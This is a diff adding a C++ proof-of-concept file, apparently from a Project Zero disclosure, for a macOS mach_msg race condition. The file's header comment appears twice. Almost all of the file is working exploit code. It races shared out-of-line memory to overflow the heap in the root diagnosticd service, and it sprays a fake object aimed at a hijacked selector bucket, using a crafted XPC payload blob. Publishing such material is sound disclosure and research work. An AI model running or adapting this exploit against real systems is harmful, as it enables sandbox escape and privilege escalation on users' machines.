@@ -1,0 +1,261 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1083
+
+When sending ool memory via |mach_msg| with |deallocate| flag or |MACH_MSG_VIRTUAL_COPY| flag, |mach_msg| performs moving the memory to the destination process instead of copying it. But it doesn't consider the memory entry object that could resurrect the moved memory. As a result, it could lead to a shared memory race condition.
+
+Exploitation:
+We need specific code that references the memory twice from |mach_msg|.
+Here's a snippet of such a function |xpc_dictionary_insert|.
+
+v14 = strlen(shared_memory);  <<-- 1st
+v15 = _xpc_malloc(v14 + 41);
+...
+strcpy((char *)(v15 + 32), shared_memory);  <<-- 2nd
+
+If we change the string's length bigger before |strcpy| is called, it will result in a heap overflow.
+
+This bug is triggerable from a sandboxed process.
+
+The attached PoC will crash diagnosticd(running as root). It requires more than 512MB memory to run.
+
+Tested on macOS Sierra 10.12.2(16C67).
+
+clang++ -o poc poc.cc -std=c++11
+*/
+
+/*
+macOS/IOS: mach_msg: doesn't copy memory
+
+When sending ool memory via |mach_msg| with |deallocate| flag or |MACH_MSG_VIRTUAL_COPY| flag, |mach_msg| performs moving the memory to the destination process instead of copying it. But it doesn't consider the memory entry object that could resurrect the moved memory. As a result, it could lead to a shared memory race condition.
+
+Exploitation:
+We need specific code that references the memory twice from |mach_msg|.
+Here's a snippet of such a function |xpc_dictionary_insert|.
+
+v14 = strlen(shared_memory);  <<-- 1st
+v15 = _xpc_malloc(v14 + 41);
+...
+strcpy((char *)(v15 + 32), shared_memory);  <<-- 2nd
+
+If we change the string's length bigger before |strcpy| is called, it will result in a heap overflow.
+
+This bug is triggerable from a sandboxed process.
+
+The attached PoC will crash diagnosticd(running as root). It requires more than 512MB memory to run.
+
+Tested on macOS Sierra 10.12.2(16C67).
+
+clang++ -o poc poc.cc -std=c++11
+
+*/
+
+#include <stdint.h>
+#include <stdio.h>
+#include <xpc/xpc.h>
+#include <assert.h>
+#include <iostream>
+#include <CoreFoundation/CoreFoundation.h>
+#include <dlfcn.h>
+#include <mach/mach.h>
+#include <mach-o/dyld_images.h>
+#include <printf.h>
+#include <dispatch/dispatch.h>
+
+#include <vector>
+#include <chrono>
+#include <thread>
+
+struct RaceContext {
+    std::vector<uint8_t> payload;
+    size_t race_offset;
+    
+    std::vector<uint8_t> spray;
+    size_t spray_size;
+};
+
+xpc_object_t empty_request = xpc_dictionary_create(nullptr, nullptr, 0);
+
+double now() {
+    return std::chrono::duration<double>(std::chrono::system_clock::now().time_since_epoch()).count();
+}
+
+mach_port_t createMemoryEntry(memory_object_size_t size) {
+    vm_address_t addr = 0;
+    vm_allocate(mach_task_self(), &addr, size, true);
+
+    memset((void*)addr, 0, size);
+
+    mach_port_t res = 0;
+    mach_make_memory_entry_64(mach_task_self(), &size, addr, 0x0000000000200043, &res, 0);
+
+    vm_deallocate(mach_task_self(), addr, size);
+
+    return res;
+}
+
+void sendPayload(const RaceContext* ctx) {
+    size_t data_size = ctx->spray_size;
+    
+    mach_port_t mem_entry = createMemoryEntry(data_size);
+
+    uint8_t* data = nullptr;
+    vm_map(mach_task_self(), (vm_address_t*)&data, data_size, 0LL, 1, mem_entry, 0LL, 0, 67, 67, 2u);
+
+    memcpy(data, &ctx->payload[0], ctx->payload.size());
+    
+    for (size_t i = 0x1000; i < data_size; i += 0x1000) {
+        memcpy(&data[i], &ctx->spray[0], ctx->spray.size());
+    }
+    
+    for (int32_t i = 0; i < 0x4000; i++) {
+        double start = now();
+        
+        xpc_connection_t client = xpc_connection_create_mach_service("com.apple.diagnosticd", NULL, 0);
+        xpc_connection_set_event_handler(client, ^(xpc_object_t event) {
+
+        });
+        xpc_connection_resume(client);
+        xpc_release(xpc_connection_send_message_with_reply_sync(client, empty_request));
+        
+        double duration = now() - start;
+        printf("duration: %f\n", duration);
+
+        if (duration > 2.0) {
+            xpc_release(client);
+            break;
+        }
+        
+        mach_port_t service_port = ((uint32_t*)client)[15];
+        
+        void* msg_data = nullptr;
+        vm_map(mach_task_self(), (vm_address_t*)&msg_data, data_size, 0LL, 1, mem_entry, 0LL, 0, 67, 67, 2u);
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool_desc;
+        } m = {};
+        
+        m.hdr.msgh_size = sizeof(m);
+        m.hdr.msgh_local_port = MACH_PORT_NULL;
+        m.hdr.msgh_remote_port = service_port;
+        m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND | MACH_MSGH_BITS_COMPLEX, 0);
+        m.hdr.msgh_id = 0x10000000;
+        
+        m.body.msgh_descriptor_count = 1;
+        
+        m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
+        m.ool_desc.address = msg_data;
+        m.ool_desc.size = (mach_msg_size_t)data_size;
+        m.ool_desc.deallocate = 1;
+        m.ool_desc.copy = MACH_MSG_VIRTUAL_COPY;
+
+        bool stop = true;
+        std::thread syncer([&] {
+            while (stop);
+            xpc_release(xpc_connection_send_message_with_reply_sync(client, empty_request));
+            stop = true;
+        });
+        
+        size_t race_offset = ctx->race_offset;
+        __uint128_t orig = *(__uint128_t*)&data[race_offset];
+        __uint128_t new_one = *(const __uint128_t*)"AAAAAAAAAAAAAAAA";
+        
+        mach_msg(&m.hdr, MACH_SEND_MSG, m.hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+
+        stop = false;
+        while (!stop) {
+            *(__uint128_t*)&data[race_offset] = orig;
+            *(__uint128_t*)&data[race_offset] = new_one;
+        }
+        
+        syncer.join();
+        *(__uint128_t*)&data[race_offset] = orig;
+        
+        xpc_release(client);
+    }
+    
+    mach_port_deallocate(mach_task_self(), mem_entry);
+}
+
+const void* memSearch(const void* base, const void* data, size_t size) {
+    const uint8_t* p = (const uint8_t*)base;
+    for (;;) {
+        if (!memcmp(p, data, size))
+            return p;
+        
+        p++;
+    }
+}
+
+void* getLibraryAddress(const char* library_name) {
+    task_dyld_info_data_t task_dyld_info;
+    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+    
+    task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count);
+    
+    const struct dyld_all_image_infos* all_image_infos = (const struct dyld_all_image_infos*)task_dyld_info.all_image_info_addr;
+    const struct dyld_image_info* image_infos = all_image_infos->infoArray;
+    
+    for (size_t i = 0; i < all_image_infos->infoArrayCount; i++) {
+        const char* image_name = image_infos[i].imageFilePath;
+        mach_vm_address_t image_load_address = (mach_vm_address_t)image_infos[i].imageLoadAddress;
+        if (strstr(image_name, library_name)){
+            return (void*)image_load_address;
+        }
+    }
+    return 0;
+}
+
+void initRace(RaceContext* ctx) {
+    struct FakeObject {
+        void* unk[2];
+        void* ref_to_bucket;
+        void* padd[0x10];
+        struct {
+            const void* sel;
+            const void* func;
+        } bucket;
+    };
+    
+    const uint32_t kXpcData[] = {0x58504321, 0x00000005, 0x0000f000, 0x00000964, 0x00000002, 0x69746361, 0x00006e6f, 0x00004000, 0x00000003, 0x00000000, 0x73646970, 0x00000000, 0x0000e000, 0x0000093c, 0x00000001, 0x0000f000, 0x00000930, 0x0000004b, 0x00003041, 0x0000f000, 0x00000004, 0x00000000, 0x00003141, 0x0000f000, 0x00000004, 0x00000000, 0x00003241, 0x0000f000, 0x00000004, 0x00000000, 0x00003341, 0x0000f000, 0x00000004, 0x00000000, 0x00003441, 0x0000f000, 0x00000004, 0x00000000, 0x00003541, 0x0000f000, 0x00000004, 0x00000000, 0x00003641, 0x0000f000, 0x00000004, 0x00000000, 0x00003741, 0x0000f000, 0x00000004, 0x00000000, 0x00003841, 0x0000f000, 0x00000004, 0x00000000, 0x00003941, 0x0000f000, 0x00000004, 0x00000000, 0x00303141, 0x0000f000, 0x00000004, 0x00000000, 0x00313141, 0x0000f000, 0x00000004, 0x00000000, 0x00323141, 0x0000f000, 0x00000004, 0x00000000, 0x00333141, 0x0000f000, 0x00000004, 0x00000000, 0x00343141, 0x0000f000, 0x00000004, 0x00000000, 0x00353141, 0x0000f000, 0x00000004, 0x00000000, 0x00363141, 0x0000f000, 0x00000004, 0x00000000, 0x00373141, 0x0000f000, 0x00000004, 0x00000000, 0x00383141, 0x0000f000, 0x00000004, 0x00000000, 0x00393141, 0x0000f000, 0x00000004, 0x00000000, 0x00303241, 0x0000f000, 0x00000004, 0x00000000, 0x00313241, 0x0000f000, 0x00000004, 0x00000000, 0x00323241, 0x0000f000, 0x00000004, 0x00000000, 0x00333241, 0x0000f000, 0x00000004, 0x00000000, 0x00343241, 0x0000f000, 0x00000004, 0x00000000, 0x00353241, 0x0000f000, 0x00000004, 0x00000000, 0x00363241, 0x0000f000, 0x00000004, 0x00000000, 0x00373241, 0x0000f000, 0x00000004, 0x00000000, 0x00383241, 0x0000f000, 0x00000004, 0x00000000, 0x00393241, 0x0000f000, 0x00000004, 0x00000000, 0x00303341, 0x0000f000, 0x00000004, 0x00000000, 0x00313341, 0x0000f000, 0x00000004, 0x00000000, 0x00323341, 0x0000f000, 0x00000004, 0x00000000, 0x00333341, 0x0000f000, 0x00000004, 0x00000000, 0x00343341, 0x0000f000, 0x00000004, 0x00000000, 0x00353341, 0x0000f000, 0x00000004, 0x00000000, 0x00363341, 0x0000f000, 0x00000004, 0x00000000, 0x00373341, 0x0000f000, 0x00000004, 0x00000000, 0x00383341, 0x0000f000, 0x00000004, 0x00000000, 0x00393341, 0x0000f000, 0x00000004, 0x00000000, 0x00303441, 0x0000f000, 0x00000004, 0x00000000, 0x00313441, 0x0000f000, 0x00000004, 0x00000000, 0x00323441, 0x0000f000, 0x00000004, 0x00000000, 0x00333441, 0x0000f000, 0x00000004, 0x00000000, 0x00343441, 0x0000f000, 0x00000004, 0x00000000, 0x00353441, 0x0000f000, 0x00000004, 0x00000000, 0x00363441, 0x0000f000, 0x00000004, 0x00000000, 0x00373441, 0x0000f000, 0x00000004, 0x00000000, 0x00383441, 0x0000f000, 0x00000004, 0x00000000, 0x00393441, 0x0000f000, 0x00000004, 0x00000000, 0x65746661, 0x00000072, 0x00004000, 0x00000001, 0x00000000, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x00515151, 0x0000f000, 0x00000004, 0x00000000, 0x65746661, 0x00000072, 0x0000f000, 0x00000324, 0x00000032, 0x00003041, 0x0000f000, 0x00000004, 0x00000000, 0x00003141, 0x0000f000, 0x00000004, 0x00000000, 0x00003241, 0x0000f000, 0x00000004, 0x00000000, 0x00003341, 0x0000f000, 0x00000004, 0x00000000, 0x00003441, 0x0000f000, 0x00000004, 0x00000000, 0x00003541, 0x0000f000, 0x00000004, 0x00000000, 0x00003641, 0x0000f000, 0x00000004, 0x00000000, 0x00003741, 0x0000f000, 0x00000004, 0x00000000, 0x00003841, 0x0000f000, 0x00000004, 0x00000000, 0x00003941, 0x0000f000, 0x00000004, 0x00000000, 0x00303141, 0x0000f000, 0x00000004, 0x00000000, 0x00313141, 0x0000f000, 0x00000004, 0x00000000, 0x00323141, 0x0000f000, 0x00000004, 0x00000000, 0x00333141, 0x0000f000, 0x00000004, 0x00000000, 0x00343141, 0x0000f000, 0x00000004, 0x00000000, 0x00353141, 0x0000f000, 0x00000004, 0x00000000, 0x00363141, 0x0000f000, 0x00000004, 0x00000000, 0x00373141, 0x0000f000, 0x00000004, 0x00000000, 0x00383141, 0x0000f000, 0x00000004, 0x00000000, 0x00393141, 0x0000f000, 0x00000004, 0x00000000, 0x00303241, 0x0000f000, 0x00000004, 0x00000000, 0x00313241, 0x0000f000, 0x00000004, 0x00000000, 0x00323241, 0x0000f000, 0x00000004, 0x00000000, 0x00333241, 0x0000f000, 0x00000004, 0x00000000, 0x00343241, 0x0000f000, 0x00000004, 0x00000000, 0x00353241, 0x0000f000, 0x00000004, 0x00000000, 0x00363241, 0x0000f000, 0x00000004, 0x00000000, 0x00373241, 0x0000f000, 0x00000004, 0x00000000, 0x00383241, 0x0000f000, 0x00000004, 0x00000000, 0x00393241, 0x0000f000, 0x00000004, 0x00000000, 0x00303341, 0x0000f000, 0x00000004, 0x00000000, 0x00313341, 0x0000f000, 0x00000004, 0x00000000, 0x00323341, 0x0000f000, 0x00000004, 0x00000000, 0x00333341, 0x0000f000, 0x00000004, 0x00000000, 0x00343341, 0x0000f000, 0x00000004, 0x00000000, 0x00353341, 0x0000f000, 0x00000004, 0x00000000, 0x00363341, 0x0000f000, 0x00000004, 0x00000000, 0x00373341, 0x0000f000, 0x00000004, 0x00000000, 0x00383341, 0x0000f000, 0x00000004, 0x00000000, 0x00393341, 0x0000f000, 0x00000004, 0x00000000, 0x00303441, 0x0000f000, 0x00000004, 0x00000000, 0x00313441, 0x0000f000, 0x00000004, 0x00000000, 0x00323441, 0x0000f000, 0x00000004, 0x00000000, 0x00333441, 0x0000f000, 0x00000004, 0x00000000, 0x00343441, 0x0000f000, 0x00000004, 0x00000000, 0x00353441, 0x0000f000, 0x00000004, 0x00000000, 0x00363441, 0x0000f000, 0x00000004, 0x00000000, 0x00373441, 0x0000f000, 0x00000004, 0x00000000, 0x00383441, 0x0000f000, 0x00000004, 0x00000000, 0x00393441, 0x0000f000, 0x00000004, 0x00000000, 0x00003042, 0x0000f000, 0x00000004, 0x00000000, 0x00003142, 0x0000f000, 0x00000004, 0x00000000, 0x00003242, 0x0000f000, 0x00000004, 0x00000000, 0x00003342, 0x0000f000, 0x00000004, 0x00000000, 0x00003442, 0x0000f000, 0x00000004, 0x00000000, 0x00003542, 0x0000f000, 0x00000004, 0x00000000, 0x00003642, 0x0000f000, 0x00000004, 0x00000000, 0x00003742, 0x0000f000, 0x00000004, 0x00000000, 0x00003842, 0x0000f000, 0x00000004, 0x00000000, 0x00003942, 0x0000f000, 0x00000004, 0x00000000, 0x00303142, 0x0000f000, 0x00000004, 0x00000000, 0x00313142, 0x0000f000, 0x00000004, 0x00000000, 0x00323142, 0x0000f000, 0x00000004, 0x00000000, 0x00333142, 0x0000f000, 0x00000004, 0x00000000, 0x00343142, 0x0000f000, 0x00000004, 0x00000000, 0x00353142, 0x0000f000, 0x00000004, 0x00000000, 0x00363142, 0x0000f000, 0x00000004, 0x00000000, 0x00373142, 0x0000f000, 0x00000004, 0x00000000, 0x00383142, 0x0000f000, 0x00000004, 0x00000000, 0x00393142, 0x0000f000, 0x00000004, 0x00000000, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x51515151, 0x00515151, 0x00008000, 0x00000009, 0x68746d69, 0x67617465, 0x00000000, 0x65746661, 0x00000072, 0x0000f000, 0x00000004, 0x00000000};
+    const size_t kTagOffset = 0x954;
+    const uintptr_t kSprayedAddr = 0x120101010;
+    
+    //ctx->data.resize(0x10000);
+    ctx->payload.resize(0x1000);
+    ctx->race_offset = kTagOffset - 0x10;
+    
+    memcpy(&ctx->payload[0], kXpcData, sizeof(kXpcData));
+    *(uintptr_t*)&ctx->payload[kTagOffset] = kSprayedAddr;
+    
+    ctx->spray.resize(0x300);
+    ctx->spray_size = 1024 * 1024 * 512;
+    
+    void* libdispatch = getLibraryAddress("libdispatch.dylib");
+    
+    FakeObject* predict = (FakeObject*)kSprayedAddr;
+    FakeObject* obj = (FakeObject*)&ctx->spray[kSprayedAddr & 0xff];
+    obj->ref_to_bucket = &predict->bucket;
+    obj->bucket.sel = memSearch(libdispatch, "_xref_dispose", 14);
+    obj->bucket.func = (void*)0x9999;
+}
+
+int32_t main() {
+    xpc_connection_t client = xpc_connection_create_mach_service("com.apple.diagnosticd", NULL, 0);
+    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {
+
+    });
+    xpc_connection_resume(client);
+    xpc_release(xpc_connection_send_message_with_reply_sync(client, empty_request));
+
+    RaceContext ctx;
+    initRace(&ctx);
+
+    printf("attach the debugger to diagnosticd\n");
+    getchar();
+
+    sendPayload(&ctx);
+    
+    return 0;
+}
